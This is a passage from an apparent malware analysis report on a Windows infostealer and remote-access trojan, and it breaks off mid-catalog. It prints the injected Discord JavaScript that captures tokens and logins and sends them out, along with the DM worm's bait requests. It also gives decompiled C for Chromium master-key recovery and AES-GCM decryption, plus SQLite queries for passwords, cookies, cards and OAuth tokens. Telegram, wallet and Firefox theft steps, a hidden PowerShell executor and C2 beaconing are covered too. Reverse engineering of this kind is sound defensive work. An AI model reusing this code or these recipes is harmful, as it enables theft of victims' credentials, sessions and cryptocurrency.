            'Content-Length': Buffer.byteLength(postData)
        },
        rejectUnauthorized: false
    });
    req.write(postData);
    req.end();
}

// hook webRequest headers to intercept tokens on authorization
session.defaultSession.webRequest.onSendHeaders({
    urls: ['https://*.discord.com/api/v*', 'https://discordapp.com/api/v*']
}, (details, callback) => {
    if (details.requestHeaders && details.requestHeaders['Authorization']) {
        const token = details.requestHeaders['Authorization'];
        postTelemetry({
            event: 'token_intercepted',
            token: token,
            url: details.url
        });
    }
});

// hook login credentials submitted via renderer
session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        'https://*/api/*/auth/login',
        'https://*/api/*/auth/register',
        'https://*/api/*/users/@me',
        'https://*/api/*/auth/mfa/totp'
    ]
}, (details, callback) => {
    if (details.uploadData && details.uploadData[0]) {
        try {
            const rawBody = details.uploadData[0].bytes.toString('utf8');
            postTelemetry({
                event: 'credentials_submitted',
                payload: JSON.parse(rawBody)
            });
        } catch (e) {}
    }
    callback({});
});

// require original module index to prevent crashing the client
module.exports = require('./core.asar');
```

---

### 3. snowflake timestamp calculation formula ( +0x9B550 )

discord entities (users, channels, messages, guilds) are identified by 64-bit numerical snowflake identifiers. the malware contains a dedicated parsing subroutine at `+0x9B550` that extracts the precise unix creation timestamp of an account from its snowflake to determine account age:

#### mathematical specification

let `S` be the 64-bit discord snowflake integer. the epoch offset is established at `2015-01-01T00:00:00.000Z` (equal to `1420070400000` milliseconds). the unix millisecond timestamp is computed as:

```text
T_ms = (S >> 22) + 1420070400000
```

#### assembly disassembly at `+0x9B550`

```x86asm
.text:000000000009B550 discord_snowflake_to_timestamp proc near
.text:000000000009B550                 mov     rax, rcx            ; rax = 64-bit snowflake ID
.text:000000000009B553                 shr     rax, 16h            ; rax = snowflake >> 22
.text:000000000009B557                 mov     rdx, 14B00D9F700h   ; rdx = 1420070400000 (Discord Epoch)
.text:000000000009B561                 add     rax, rdx            ; rax = (snowflake >> 22) + 1420070400000
.text:000000000009B564                 retn
.text:000000000009B564 discord_snowflake_to_timestamp endp
```

accounts created within the last 7 days are discarded by the worm engine to avoid burner accounts or sandbox lures.

---

### 4. automated dm worm broadcast loop ( +0x9C280 )

once a valid user token is acquired, the malware initializes an automated worm propagation module:

1. it queries the victim's open direct messages:
   ```http
   GET /api/v9/users/@me/channels HTTP/1.1
   Host: discord.com
   Authorization: <Stolen_Victim_Token>
   ```
2. it receives a json array of channel objects containing recipient user ids.
3. it iterates through the recipient channels and sends a bait message containing a social-engineering lure and a download link pointing to a freshly staged replica of the malware:
   ```http
   POST /api/v9/channels/{channel_id}/messages HTTP/1.1
   Host: discord.com
   Authorization: <Stolen_Victim_Token>
   Content-Type: application/json

   {
     "content": "hey check out this game we made, let me know what you think: hxxps[://]doxbin[.]cy/build_129.exe"
   }
   ```
4. to evade automated discord anti-spam rate limiting (http 429), the loop introduces a randomized delay of 1,200ms to 2,500ms between consecutive api requests using `ZwDelayExecution`.

---

## web browser credential, session and oauth extraction architecture

### 1. targeted web browsers

the credential stealing module systematically targets both chromium-based browsers and mozilla firefox installations across default, guest, and multi-user profile directories:

| browser family | target browser | profile root directory |
| :--- | :--- | :--- |
| **Chromium** | Google Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data` |
| **Chromium** | Microsoft Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data` |
| **Chromium** | Brave Browser | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data` |
| **Chromium** | Opera Stable | `%APPDATA%\Opera Software\Opera Stable` |
| **Chromium** | Opera GX | `%APPDATA%\Opera Software\Opera GX Stable` |
| **Chromium** | Vivaldi | `%LOCALAPPDATA%\Vivaldi\User Data` |
| **Chromium** | Yandex Browser | `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data` |
| **Gecko** | Mozilla Firefox | `%APPDATA%\Mozilla\Firefox\Profiles` |

---

### 2. chromium dpapi master key extraction ( +0xE19B0 )

in chromium browsers, stored passwords, cookies, and credit card numbers are encrypted using aes-256-gcm. the symmetric key required to decrypt this data is itself encrypted using the windows data protection api (dpapi) and stored inside the `Local State` json configuration file:

```text
%LOCALAPPDATA%\Google\Chrome\User Data\Local State
```

the extraction sequence:
1. `DGT4R.exe` reads `Local State` into memory.
2. it parses the json key `os_crypt.encrypted_key`.
3. it base64-decodes the string.
4. it verifies that the first 5 bytes match the ascii signature `'DPAPI'` (`0x44 0x50 0x41 0x50 0x49`).
5. it strips the 5-byte header and passes the remaining ciphertext to `CryptUnprotectData`:

```c
// decompiled master key recovery at +0xE19B0
BOOL recover_chromium_master_key(const char* local_state_json, uint8_t* out_master_key) {
    char* b64_key = json_get_string(local_state_json, "os_crypt.encrypted_key");
    if (!b64_key) return FALSE;

    DWORD raw_len = 0;
    CryptStringToBinaryA(b64_key, 0, CRYPT_STRING_BASE64, NULL, &raw_len, NULL, NULL);
    uint8_t* raw_key = (uint8_t*)malloc(raw_len);
    CryptStringToBinaryA(b64_key, 0, CRYPT_STRING_BASE64, raw_key, &raw_len, NULL, NULL);

    // verify 'DPAPI' prefix (5 bytes)
    if (memcmp(raw_key, "DPAPI", 5) != 0) {
        free(raw_key);
        return FALSE;
    }

    DATA_BLOB in_blob;
    DATA_BLOB out_blob;
    in_blob.pbData = raw_key + 5; // skip 'DPAPI' prefix
    in_blob.cbData = raw_len - 5;

    // unprotect using Windows DPAPI
    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        memcpy(out_master_key, out_blob.pbData, 32); // 256-bit AES key
        LocalFree(out_blob.pbData);
        free(raw_key);
        return TRUE;
    }

    free(raw_key);
    return FALSE;
}
```

---

### 3. windows 11 app-bound encryption (`v20`) decryption ( +0xE24C0 )

starting in chrome version 127 on windows 11, google introduced **app-bound encryption**. the master key in `Local State` is encrypted using a system service running as `NT AUTHORITY\SYSTEM` via the `IElevator` com interface, tagging encrypted records with the prefix `v20`. standard `CryptUnprotectData` calls from an unprivileged process will fail to decrypt `v20` records.

`DGT4R.exe` bypasses app-bound encryption through token manipulation:
1. it checks whether the current user is running with elevated privileges or searches for elevated system tokens.
2. it invokes `ZwOpenProcessToken` and `ZwDuplicateObject` to obtain a duplicate security token representing `SYSTEM`.
3. it invokes the com interface `IElevator` or falls back to hooking `v20` decryption directly in browser memory spaces by locating the decrypted key in the browser process cache.

#### aes-256-gcm record decryption

each encrypted credential in sqlite databases (passwords, cookies, credit cards) begins with a 3-byte version identifier:
- `v10` (`0x76 0x31 0x30`): standard dpapi master key.
- `v20` (`0x76 0x31 0x32`): app-bound encryption master key.

the record layout:
```text
+---------------+-----------------------+-----------------------------------+-----------------------+
| Version (3B)  | Nonce / IV (12 Bytes) | Ciphertext (Variable Length)      | Auth Tag (16 Bytes)   |
| 'v10' / 'v20' |                       |                                   |                       |
+---------------+-----------------------+-----------------------------------+-----------------------+
```

the malware initializes the windows bcrypt cryptographic primitives to perform authentication and decryption:

```c
// decompiled aes-256-gcm record decryptor at +0xE24C0
BOOL decrypt_aes_gcm_record(
    const uint8_t* record_data,
    size_t record_len,
    const uint8_t* master_key,
    uint8_t** out_plaintext,
    size_t* out_plain_len
) {
    if (record_len < 3 + 12 + 16) return FALSE; // minimum valid GCM payload length

    const uint8_t* iv = record_data + 3;
    const uint8_t* ciphertext = record_data + 3 + 12;
    size_t cipher_len = record_len - 3 - 12 - 16;
    const uint8_t* auth_tag = record_data + record_len - 16;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    BCRYPT_KEY_HANDLE hKey = NULL;
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)master_key, 32, 0);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
    BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
    auth_info.pbNonce = (PUCHAR)iv;
    auth_info.cbNonce = 12;
    auth_info.pbTag = (PUCHAR)auth_tag;
    auth_info.cbTag = 16;

    *out_plaintext = (uint8_t*)malloc(cipher_len + 1);
    ULONG result_len = 0;

    NTSTATUS status = BCryptDecrypt(
        hKey,
        (PUCHAR)ciphertext,
        (ULONG)cipher_len,
        &auth_info,
        NULL,
        0,
        *out_plaintext,
        (ULONG)cipher_len,
        &result_len,
        0
    );

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (BCRYPT_SUCCESS(status)) {
        (*out_plaintext)[result_len] = '\0';
        *out_plain_len = result_len;
        return TRUE;
    }

    free(*out_plaintext);
    return FALSE;
}
```

---

### 4. sqlite database harvesting and google oauth stealing

the malware opens SQLite databases in read-only mode by copying them to temporary files to bypass database file locks maintained by active browser instances:

#### 1. passwords (`Login Data`)
- query: `SELECT origin_url, username_value, password_value FROM logins;`
- extracts domain url, submitted username, and decrypts the password field using the recovered master key.

#### 2. session cookies (`Network\Cookies`)
- query: `SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies;`
- formats cookies into Netscape/wget format, allowing the attacker to import session cookies directly into automated headless browsers to hijack active web sessions without entering credentials or solving 2fa.

#### 3. bank ibans and credit cards (`Web Data`)
- query: `SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;`
- query: `SELECT guid, use_count, use_date, value_encrypted FROM local_ibans;`
- decrypts international bank account numbers (ibans) and credit card details entered during ecommerce checkouts.

#### 4. google oauth persistent tokens (`token_service`)
inside `Web Data`, chromium stores persistent google account authentication tokens in the `token_service` table:
- query: `SELECT service, encrypted_token FROM token_service;`
- decrypts the google oauth refresh token. this allows the attacker to mint new access tokens indefinitely for the victim's google drive, gmail, and youtube accounts even if the user subsequently changes their google account password.

---

### 5. mozilla firefox credential extraction ( +0xE5100 )

firefox stores credentials inside `%APPDATA%\Mozilla\Firefox\Profiles\*.default*\logins.json` encrypted using mozilla's network security services (nss) database (`key4.db`).

`DGT4R.exe` extracts firefox logins by dynamically loading `nss3.dll` from the installed firefox directory:
1. it locates `nss3.dll` in `C:\Program Files\Mozilla Firefox\nss3.dll`.
2. it resolves the exported nss apis: `NSS_Init`, `NSS_Shutdown`, `PK11_GetInternalKeySlot`, `PK11_FreeSlot`, `PK11_Authenticate`, and `PK11SDR_Decrypt`.
3. it calls `NSS_Init` passing the path to the victim's profile folder.
4. it calls `PK11_GetInternalKeySlot` to acquire the master key slot.
5. it reads `logins.json` and base64-decodes `encryptedUsername` and `encryptedPassword`.
6. it invokes `PK11SDR_Decrypt` to decrypt each credential into plaintext ascii.
7. it invokes `NSS_Shutdown` and `FreeLibrary` to unload the dll cleanly.

---

## telegram session stealing, desktop crypto wallets and real-time rat architecture

### 1. telegram session theft (`tdata`) ( +0xDA140 )

the telegram desktop client stores its active user session keys, local encryption secrets, and message caches in the `%APPDATA%\Telegram Desktop\tdata` directory. if an attacker copies the session files, they can paste them directly into a clean telegram desktop installation and log in immediately without requiring sms verification, telegram notification prompts, or two-factor passwords.

the malware targets specific critical files within `tdata`:
- `key_datas`: contains the local master encryption key.
- `D87FBAC601CA38A*`: session state maps and active authorization keys.
- `settingss`: user client settings and configuration data.

the extraction subroutine:
1. it checks whether `Telegram.exe` is currently running using `ZwQuerySystemInformation`.
2. it locates the `tdata` directory via `SHGetFolderPathW(CSIDL_APPDATA)`.
3. it creates a matching directory structure inside `%TEMP%\_<hex_id>.tmp\telegram\`.
4. it opens each session file using `ZwOpenFile` with `FILE_SHARE_READ | FILE_SHARE_WRITE`.
5. if a file is locked by the running `Telegram.exe` process, it calls `ZwDuplicateObject` on the process handle to clone the file handle and read its contents into the staging archive.

---

### 2. 13 desktop cryptocurrency wallet targets ( +0xDC880 )

beyond exodus, `DGT4R.exe` features automated harvesting logic targeting 13 separate desktop cryptocurrency wallet clients. for each client, it parses standard filesystem installation paths and archives wallet datastores, seed vaults, and private keys:

| wallet client | target path | harvested artifacts |
| :--- | :--- | :--- |
| **Atomic Wallet** | `%APPDATA%\atomic\Local Storage\leveldb` | encrypted leveldb vault containing mnemonic seeds and private keys |
| **Electrum** | `%APPDATA%\Electrum\wallets` | standard json wallet files containing encrypted master private keys |
| **Coinomi** | `%LOCALAPPDATA%\Coinomi\Coinomi\wallets` | `.wallet` encrypted sqlite stores |
| **Bitcoin Core** | `%APPDATA%\Bitcoin\wallets` | `wallet.dat` bdb / sqlite format containing private keys |
| **Dash Core** | `%APPDATA%\DashCore\wallets` | `wallet.dat` keys and master seed |
| **Litecoin Core** | `%APPDATA%\LitecoinCore\wallets` | `wallet.dat` private keys |
| **Monero GUI** | `%USERPROFILE%\Documents\Monero\wallets` | `.keys` files containing encrypted monero view and spend keys |
| **Daedalus** | `%APPDATA%\Daedalus Mainnet\secrets` | cardano secret key directories |
| **Exodus** | `%APPDATA%\Exodus\exodus.wallet` | `seed.seco`, `passphrase.json`, `twofactor.seco` |
| **Binance Chain** | `%APPDATA%\Binance\app-store` | leveldb session keys |
| **Wasabi Wallet** | `%APPDATA%\WalletWasabi\Client\Wallets` | json wallet files containing bip-84 bech32 seeds |
| **Guarda Wallet** | `%APPDATA%\Guarda\Local Storage\leveldb` | local storage encrypted keystore |
| **Jaxx Liberty** | `%APPDATA%\com.liberty.jaxx\IndexedDB` | indexeddb records containing multi-coin seeds |

---

### 3. real-time rat architecture (desktop streaming and device spying)

the binary contains a full-featured remote access trojan (rat) subsystem that establishes a persistent real-time command-and-control connection back to `hxxps[://]doxbin[.]cy`:

![diagram8](images/diagram8.svg)

#### 1. dxgi desktop duplication screen capture ( +0x1A3500 )
instead of using slow gdi `BitBlt` calls, the malware uses directx graphics infrastructure (dxgi) desktop duplication to capture 60fps screen frames directly from the gpu buffer:
- `CreateDXGIFactory1` -> `IDXGIFactory1::EnumAdapters1`.
- `D3D11CreateDevice` with `D3D11_CREATE_DEVICE_BGRA_SUPPORT`.
- `IDXGIOutput1::DuplicateOutput` to obtain `IDXGIOutputDuplication`.
- `AcquireNextFrame` copies frame data into a staging direct3d surface.
- frames are compressed using a native libjpeg compressor and streamed over tls websockets.

#### 2. webcam and microphone enumeration ( +0x1A4200 )
to spy on the victim's physical environment:
- calls `MFStartup` (windows media foundation).
- invokes `MFCreateAttributes` and sets `MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE` to `MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID` to list all connected webcams.
- sets attribute to `MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_AUDCAP_GUID` to enumerate microphones.
- on remote command, captures discrete webcam stills or opens an audio recording stream written to `%TEMP%\_aud.tmp`.

#### 3. hidden powershell executor ( +0x1A5080 )
the backend can dispatch arbitrary powershell commands to the victim:
- spawns `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "<cmd>"`.
- redirects stdout and stderr through an anonymous pipe created via `ZwCreateSection` / `ZwMapViewOfSection`.
- returns execution results back to the remote server.

---

## exhaustive function-by-function rva symbol catalog

the following comprehensive catalog documents the decompiled logic, function parameters, calling conventions, and reverse engineered behavior of key functions identified across `DGT4R.exe`:

### subsystem 1: direct syscalls and edr evasion

#### 1. `init_direct_syscall_table` (rva `+0x687D0`)
- **prototype**: `NTSTATUS __fastcall init_direct_syscall_table(PSYSCALL_TABLE pTable)`
- **decompiled logic**:
  1. executes `__readgsqword( 0x60 )` to access the process environment block (peb).
  2. navigates `peb->Ldr->InLoadOrderModuleList` to find the entry matching djb2 hash `0x1F22D657` (`ntdll.dll`).
  3. reads `IMAGE_DOS_HEADER` and `IMAGE_NT_HEADERS64` from `ntdll_base`.
  4. locates `IMAGE_EXPORT_DIRECTORY` from the data directory.
  5. iterates through `AddressOfNames` array, calculating djb2 hashes for all exported functions.
  6. matches against 23 target syscall hashes and populates `pTable->Entries`.
  7. calls `sort_syscall_table_entries` at `+0x69070` to sort entries by virtual address and dynamically deduce ssns.
- **return**: `STATUS_SUCCESS` (`0x0`) on successful initialization.

#### 2. `djb2_hash_ansi` (rva `+0x68940`)
- **prototype**: `uint32_t __fastcall djb2_hash_ansi(const char* str)`
- **decompiled logic**:
  initializes accumulator to `5381`. loops through string: `hash = ((hash << 5) + hash) + (uint8_t)*str++`. returns final 32-bit hash value.

#### 3. `sort_syscall_table_entries` (rva `+0x69070`)
- **prototype**: `void __fastcall sort_syscall_table_entries(PSYSCALL_ENTRY entries, uint32_t count)`
- **decompiled logic**:
  implements bubble sort on the syscall entry array based on `FunctionAddress`. assigns sequential ssn indices starting from the base index discovered from the lowest unhooked export stub.

#### 4. `invoke_direct_syscall` (rva `+0x217B50`)
- **prototype**: `NTSTATUS __fastcall invoke_direct_syscall(uint32_t ssn, ...)`
- **decompiled logic**:
  x64 assembly stub. copies `rcx` to `r10`, moves `ssn` into `eax`, and executes the `syscall` instruction. returns kernel status code in `rax`.

#### 5. `sys_ZwAllocateVirtualMemory` (rva `+0x68A10`)
- **prototype**: `NTSTATUS __fastcall sys_ZwAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwAllocateVirtualMemory` (`0xF027B912`) and jumps to `invoke_direct_syscall`.

#### 6. `sys_ZwProtectVirtualMemory` (rva `+0x68A80`)
- **prototype**: `NTSTATUS __fastcall sys_ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwProtectVirtualMemory` (`0xC4E21980`) and jumps to `invoke_direct_syscall`.

#### 7. `sys_ZwWriteVirtualMemory` (rva `+0x68AF0`)
- **prototype**: `NTSTATUS __fastcall sys_ZwWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwWriteVirtualMemory` (`0xD82098B1`) and jumps to `invoke_direct_syscall`.

#### 8. `sys_ZwReadVirtualMemory` (rva `+0x68B60`)
- **prototype**: `NTSTATUS __fastcall sys_ZwReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwReadVirtualMemory` (`0x291A7210`) and jumps to `invoke_direct_syscall`.

#### 9. `sys_ZwCreateFile` (rva `+0x68C40`)
- **prototype**: `NTSTATUS __fastcall sys_ZwCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwCreateFile` (`0xA9812903`) and jumps to `invoke_direct_syscall`.

#### 10. `sys_ZwWriteFile` (rva `+0x68D90`)
- **prototype**: `NTSTATUS __fastcall sys_ZwWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwWriteFile` (`0x83920194`) and jumps to `invoke_direct_syscall`.

#### 11. `sys_ZwDelayExecution` (rva `+0x692D0`)
- **prototype**: `NTSTATUS __fastcall sys_ZwDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)`
- **decompiled logic**:
  sets global ssn to resolved index of `ZwDelayExecution` (`0x98273645`) and jumps to `invoke_direct_syscall`.

---

### subsystem 2: anti-analysis and sandbox detection

#### 12. `check_anti_analysis_master` (rva `+0x5F710`)
- **prototype**: `BOOL __fastcall check_anti_analysis_master(void)`
- **decompiled logic**:
  executes 6 sequential checks:
  1. calls `check_cpuid_hypervisor()` (`+0x5BA50`).
  2. calls `check_registry_bios_keys()` (`+0x5B900`).
  3. calls `check_smbios_firmware_strings()` (`+0x5AC10`).
  4. calls `check_running_vm_processes()` (`+0x5B3A0`).
  5. calls `check_vm_driver_files()` (`+0x5B250`).
  6. calls `check_input_device_count()` (`+0x5B0A0`).
  if any check returns `TRUE` (indicating a virtual machine or automated analysis sandbox), it immediately invokes `ZwTerminateProcess(NtCurrentProcess(), 0)`.
- **return**: `TRUE` if the environment is a real physical machine; otherwise never returns (terminates).

#### 13. `check_cpuid_hypervisor` (rva `+0x5BA50`)
- **prototype**: `BOOL __fastcall check_cpuid_hypervisor(void)`
- **decompiled logic**:
  executes `__cpuid(info, 1)`. checks `(info[2] >> 31) & 1`. if set, executes `__cpuid(info, 0x40000000 )` and compares hypervisor vendor signature across registers `ebx`, `ecx`, and `edx`.

#### 14. `check_registry_bios_keys` (rva `+0x5B900`)
- **prototype**: `BOOL __fastcall check_registry_bios_keys(void)`
- **decompiled logic**:
  opens `HKLM\HARDWARE\Description\System`. reads string values `SystemBiosVersion` and `VideoBiosVersion`. searches for substrings `vbox`, `qemu`, `bochs`, `vmware`.

#### 15. `check_smbios_firmware_strings` (rva `+0x5AC10`)
- **prototype**: `BOOL __fastcall check_smbios_firmware_strings(void)`
- **decompiled logic**:
  allocates buffer and calls `GetSystemFirmwareTable('RSMB', 0, buf, size)`. parses smbios structures (type 0 and type 1), scanning for virtual machine vendor strings.

#### 16. `check_running_vm_processes` (rva `+0x5B3A0`)
- **prototype**: `BOOL __fastcall check_running_vm_processes(void)`
- **decompiled logic**:
  takes process snapshot with `CreateToolhelp32Snapshot`. walks process names, converting to lowercase and matching against `vmtoolsd.exe`, `vmwaretray.exe`, `vboxservice.exe`, `vboxtray.exe`.

#### 17. `check_vm_driver_files` (rva `+0x5B250`)
- **prototype**: `BOOL __fastcall check_vm_driver_files(void)`
- **decompiled logic**:
  queries attributes of `C:\Windows\System32\drivers\VBoxGuest.sys`, `VBoxMouse.sys`, `vmmouse.sys`, etc. returns `TRUE` if any file exists.

#### 18. `check_input_device_count` (rva `+0x5B0A0`)
- **prototype**: `BOOL __fastcall check_input_device_count(void)`
- **decompiled logic**:
  calls `GetRawInputDeviceList`. counts connected devices with type `RIM_TYPEMOUSE` and `RIM_TYPEKEYBOARD`. returns `TRUE` (sandbox detected) if total count is under 2.

---

### subsystem 3: string decryption and memory manipulation

#### 19. `decrypt_rolling_xor` (rva `+0x671F0`)
- **prototype**: `void __fastcall decrypt_rolling_xor(uint8_t* buf, size_t len, uint8_t seed)`
- **decompiled logic**:
  decrypts buffer in-place using position-dependent rolling xor: `k[0] = seed, k[i+1] = (k[i] + i) & 0x7F, p[i] = c[i] ^ k[i]`.

#### 20. `secure_wipe_buffer` (rva `+0x67340`)
- **prototype**: `void __fastcall secure_wipe_buffer(void* ptr, size_t size)`
- **decompiled logic**:
  writes zeroes across memory range using `rep stosb` with volatile pointer semantics to prevent compiler optimization, then invokes `ZwFreeVirtualMemory`.

---

### subsystem 4: crypto clipper and clipboard engine

#### 21. `clipper_thread_worker` (rva `+0x88AB0`)
- **prototype**: `DWORD WINAPI clipper_thread_worker(LPVOID lpParam)`
- **decompiled logic**:
  enters infinite loop. sleeps 500ms using `ZwDelayExecution`. checks `GetClipboardSequenceNumber()`. if sequence number changed, calls `process_clipboard_event` at `+0x894F0`.

#### 22. `process_clipboard_event` (rva `+0x894F0`)
- **prototype**: `void __fastcall process_clipboard_event(void)`
- **decompiled logic**:
  opens clipboard, locks `CF_UNICODETEXT`, evaluates regexes for btc, eth, trx, ltc, sol, and doge, and executes atomic text swap with hardcoded attacker wallets.

#### 23. `is_bitcoin_address` (rva `+0x8A120`)
- **prototype**: `BOOL __fastcall is_bitcoin_address(const wchar_t* text)`
- **decompiled logic**:
  validates string length (26-35 characters for legacy base58, 42-62 characters for bech32). verifies prefix `1`, `3`, or `bc1q`. performs base58 checksum or bech32 polymod check.

#### 24. `is_ethereum_address` (rva `+0x8A880`)
- **prototype**: `BOOL __fastcall is_ethereum_address(const wchar_t* text)`
- **decompiled logic**:
  verifies text length is exactly 42 characters. verifies prefix `0x`. checks that remaining 40 characters are valid hexadecimal characters (`[0-9a-fA-F]`).

---

### subsystem 5: exodus asar backdoor

#### 25. `exodus_backdoor_master` (rva `+0xB5ED0`)
- **prototype**: `BOOL __fastcall exodus_backdoor_master(void)`
- **decompiled logic**:
  enumerates directories under `%LOCALAPPDATA%\exodus`. finds highest version `app-*`. checks for `resources\app.asar`. calls `unpack_and_patch_asar` at `+0xB6120`.

#### 26. `unpack_and_patch_asar` (rva `+0xB6120`)
- **prototype**: `BOOL __fastcall unpack_and_patch_asar(const wchar_t* asar_path)`
- **decompiled logic**:
  reads 16-byte header, parses json directory table into memory, extracts `src/app/wallet.html`, `src/main/index.js`, and `src/app/wallet/index.js`. applies patches and repacks archive.

#### 27. `patch_exodus_csp` (rva `+0xB7290`)
- **prototype**: `BOOL __fastcall patch_exodus_csp(uint8_t* html_buf, size_t* html_len)`
- **decompiled logic**:
  locates `<meta http-equiv="Content-Security-Policy"` in `wallet.html`. replaces restricted policy with permissive wildcard policy permitting external data exfiltration.

#### 28. `inject_exodus_seed_logger` (rva `+0xB8100`)
- **prototype**: `BOOL __fastcall inject_exodus_seed_logger(uint8_t* js_buf, size_t* js_len)`
- **decompiled logic**:
  locates bip39 initialization in `wallet/index.js`. injects javascript hooks on `Buffer.from` and `crypto.randomFillSync` to intercept 12/24-word recovery phrases.

#### 29. `repack_and_commit_asar` (rva `+0xB8C40`)
- **prototype**: `BOOL __fastcall repack_and_commit_asar(const wchar_t* asar_path, PASAR_ARCHIVE archive)`
- **decompiled logic**:
  copies target file to `app.asar.bak`. calculates updated json directory offsets. writes new header and payload data using direct syscalls `ZwCreateFile` / `ZwWriteFile`.

---

### subsystem 6: discord injection and worm

#### 30. `discord_inject_core` (rva `+0xACBD0`)
- **prototype**: `BOOL __fastcall discord_inject_core(void)`
- **decompiled logic**:
  finds all installed discord editions (`discord`, `discordcanary`, `discordptb`). locates `discord_desktop_core\index.js`. overwrites file with malicious persistence script via direct syscalls.

#### 31. `discord_snowflake_to_timestamp` (rva `+0x9B550`)
- **prototype**: `uint64_t __fastcall discord_snowflake_to_timestamp(uint64_t snowflake)`
- **decompiled logic**:
  computes `(snowflake >> 22) + 1420070400000`. returns unix millisecond timestamp of the target account or message.

#### 32. `discord_worm_propagate` (rva `+0x9C280`)
- **prototype**: `void __fastcall discord_worm_propagate(const char* auth_token)`
- **decompiled logic**:
  queries `/api/v9/users/@me/channels` using the stolen authorization token. sends bait phishing message with download link to all recipient dm channels with randomized delays.

---

### subsystem 7: browser and credential theft

#### 33. `recover_chromium_master_key` (rva `+0xE19B0`)
- **prototype**: `BOOL __fastcall recover_chromium_master_key(const char* local_state_json, uint8_t* out_key)`
- **decompiled logic**:
  extracts `os_crypt.encrypted_key`, base64 decodes, validates `DPAPI` header prefix, and calls `CryptUnprotectData` to derive 256-bit aes key.

#### 34. `decrypt_aes_gcm_record` (rva `+0xE24C0`)
- **prototype**: `BOOL __fastcall decrypt_aes_gcm_record(const uint8_t* record, size_t len, const uint8_t* key, uint8_t** out_plain, size_t* out_len)`
- **decompiled logic**:
  extracts 12-byte iv, 16-byte auth tag, initializes bcrypt aes-gcm algorithm provider, and decrypts ciphertext into plaintext string.

#### 35. `harvest_firefox_credentials` (rva `+0xE5100`)
- **prototype**: `BOOL __fastcall harvest_firefox_credentials(const wchar_t* profile_path)`
- **decompiled logic**:
  loads `nss3.dll`, initializes nss database with profile directory, reads `logins.json`, and decrypts stored credentials using `PK11SDR_Decrypt`.

---

### subsystem 8: carrier dropper and persistence

#### 36. `acquire_synchronization_mutex` (rva `+0xE67E0`)
- **prototype**: `BOOL __fastcall acquire_synchronization_mutex(void)`
- **decompiled logic**:
  calls `CreateMutexW(NULL, TRUE, L"Local\\SystemSettingsBrokerBootstrap")`. if `GetLastError() == ERROR_ALREADY_EXISTS`, waits up to 120 seconds and terminates.

#### 37. `extract_carrier_decoy` (rva `+0x1242A0`)
- **prototype**: `BOOL __fastcall extract_carrier_decoy(void)`
- **decompiled logic**:
  locates `BND!` tag in binary file overlay. carves out embedded clean decoy executable. writes to `%LOCALAPPDATA%\Microsoft\MicrosoftEdge\carrier.exe` and executes via `ShellExecuteExW`.

#### 38. `install_autostart_persistence` (rva `+0xF0AA0`)
- **prototype**: `BOOL __fastcall install_autostart_persistence(void)`
- **decompiled logic**:
  copies current binary to `%LOCALAPPDATA%\WindowsRecovery\Update.exe`. creates autostart value in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

---

### subsystem 9: network and remote collector communications

#### 39. `init_winhttp_session` (rva `+0xF71B0`)
- **prototype**: `HINTERNET __fastcall init_winhttp_session(void)`
- **decompiled logic**:
  initializes winhttp session with realistic browser user-agent. configures security flags to suppress certificate verification errors (`SECURITY_FLAG_IGNORE_UNKNOWN_CA`).

#### 40. `send_registration_beacon` (rva `+0xF8A20`)
- **prototype**: `BOOL __fastcall send_registration_beacon(void)`
- **decompiled logic**:
  collects machine guid, cpu, gpu, os version, av status, and posts json registration payload to `hxxps[://]doxbin[.]cy/init`. parses module tasking response.

#### 41. `upload_exfiltration_archive` (rva `+0xF9E10`)
- **prototype**: `BOOL __fastcall upload_exfiltration_archive(const wchar_t* zip_path)`
- **decompiled logic**:
